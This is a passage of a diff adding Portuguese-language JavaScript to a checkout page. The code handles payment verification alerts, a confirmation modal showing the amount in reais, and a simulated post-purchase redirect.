+                } else {
+                    btn.innerHTML = originalHTML;
+                    btn.disabled = false;
+                    alert('Pagamento ainda não foi confirmado. Verifique se completou a transação em seu banco.');
+                }
+            }, 2000);
+        }
+
+        function showPaymentConfirmed() {
+            // Atualizar status visual
+            document.getElementById('paymentConfirmedIcon').style.display = 'flex';
+            document.getElementById('paymentConfirmedText').style.display = 'block';
+            
+            // Mostrar modal de confirmação
+            document.getElementById('confirmationAmount').textContent = `R$ ${subtotalValue.toFixed(2).replace('.', ',')}`;
+            document.getElementById('paymentConfirmationModal').classList.add('active');
+
+            // Esconder botão de verificação
+            document.getElementById('btn-verify-payment').style.display = 'none';
+            document.getElementById('waiting-payment-section').style.display = 'none';
+        }
+
+        function closeConfirmationModal() {
+            document.getElementById('paymentConfirmationModal').classList.remove('active');
+            // Redirecionar para página de sucesso (simulado)
+            setTimeout(() => {
+                alert('Obrigado pela compra! Seu pedido será processado em breve.');
+                // window.location.href = 'success.html';
+            }, 500);
+        }
+
+        // Inicializar página
+        document.addEventListener('DOMContentLoaded', () => {
+            renderPaymentOptions();
+        });
     </script>
 </body>
 </html>
